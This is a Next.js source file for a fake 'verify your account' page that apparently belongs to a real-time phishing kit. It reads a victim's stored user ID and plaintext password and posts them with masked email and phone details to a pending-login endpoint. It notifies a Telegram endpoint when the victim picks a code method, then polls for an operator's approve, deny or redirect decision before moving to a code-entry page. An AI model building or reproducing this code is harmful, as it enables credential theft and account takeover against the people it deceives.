"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { LandingChrome } from "@/components/landing-chrome";
import { APPROVAL_TIMEOUT_MS, MSG_UNABLE_REACH_VERIFICATION } from "@/lib/approval-messages";
import { pollPendingLoginAbortable } from "@/lib/abortable-poll";
import { clearVerificationSession, readVerificationSession } from "@/lib/verification";

type Method = "email" | "text";

export default function VerificationMethodPage() {
  const router = useRouter();
  const [method, setMethod] = useState<Method | "">("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<React.ReactNode | null>(null);
  const guarded = useRef(false);
  const pollAbort = useRef<AbortController | null>(null);

  useEffect(() => {
    return () => {
      pollAbort.current?.abort();
    };
  }, []);

  useEffect(() => {
    if (guarded.current) return;
    guarded.current = true;
    const session = readVerificationSession();
    if (!session.userId || !session.password) {
      router.replace("/");
      return;
    }
  }, [router]);

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isLoading || !method) return;

    const session = readVerificationSession();
    if (!session.userId || !session.password) {
      router.replace("/");
      return;
    }

    setError(null);
    setIsLoading(true);

    void fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        verificationType: method === "email" ? "Email" : "Text Message",
        userId: session.userId,
        method,
      }),
    }).catch(() => {});

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: session.userId,
          password: session.password,
          method,
          maskedEmail: session.maskedEmail || "-",
          maskedPhone: session.maskedPhone || "-",
          flow: "login",
        }),
      });
      const data = (await res.json().catch(() => null)) as { id?: string } | null;
      if (!res.ok || !data?.id) {
        throw new Error("pending-login create failed");
      }

      try {
        sessionStorage.setItem("verificationMethod", method);
      } catch {
        // best-effort
      }

      const controller = new AbortController();
      pollAbort.current = controller;
      const outcome = await pollPendingLoginAbortable(
        data.id,
        APPROVAL_TIMEOUT_MS,
        controller.signal,
      );
      if (controller.signal.aborted) return;

      if (outcome === "approved") {
        router.push(`/verification/code?method=${method}`);
        return;
      }
      if (outcome === "redirected") {
        clearVerificationSession();
        window.location.href = "/api/login-out";
        return;
      }
      if (outcome === "denied") {
        clearVerificationSession();
        router.replace("/?loginDenied=1");
        return;
      }
      // timeout / error
      clearVerificationSession();
      router.replace("/?verifyUnavailable=1");
    } catch (err) {
      console.error("Verification method request failed:", err);
      setError(MSG_UNABLE_REACH_VERIFICATION);
      setIsLoading(false);
    }
  };

  return (
    <LandingChrome>
      <h2 className="text-2xl font-normal lg:text-5xl">
        Now we&apos;ll verify your account
      </h2>
      <p className="mt-4 text-sm lg:text-xl">
        We&apos;ll send a security validation code to your mobile device or
        your email address.
      </p>

      <form onSubmit={handleSubmit} className="mt-7">
        <h3 className="text-lg font-semibold lg:text-2xl">
          How would you like to receive your validation code?
        </h3>

        <div className="mt-3">
          <label
            htmlFor="email"
            className="flex cursor-pointer items-center gap-2 py-3"
          >
            <input
              id="email"
              type="radio"
              name="verification-method"
              className="ta-radio"
              value="email"
              checked={method === "email"}
              onChange={() => setMethod("email")}
            />
            <span className="font-medium">Send code to my Email</span>
          </label>
          <label
            htmlFor="text"
            className="flex cursor-pointer items-center gap-2 py-3"
          >
            <input
              id="text"
              type="radio"
              name="verification-method"
              className="ta-radio"
              value="text"
              checked={method === "text"}
              onChange={() => setMethod("text")}
            />
            <span className="font-medium">Send code to my Phone</span>
          </label>
        </div>

        <p
          className="min-h-[1.25rem] text-sm text-red-600"
          aria-live="polite"
        >
          {error ?? ""}
        </p>

        <div className="mt-4 flex flex-wrap items-center gap-4">
          <button
            type="button"
            onClick={() => router.push("/")}
            disabled={isLoading}
            className="rounded-full border-2 border-[#281805] px-8 py-4 text-xl text-[#281805] transition-colors hover:bg-[#281805] hover:text-white disabled:cursor-not-allowed disabled:opacity-50"
          >
            Cancel
          </button>
          <button
            type="submit"
            disabled={isLoading || !method}
            className="rounded-full bg-[#281805] px-8 py-4 text-xl text-white disabled:cursor-not-allowed disabled:bg-gray-400"
          >
            {isLoading && (
              <i
                className="fa-solid fa-spinner fa-spin mr-2"
                aria-hidden="true"
              />
            )}
            Submit
          </button>
        </div>
      </form>
    </LandingChrome>
  );
}
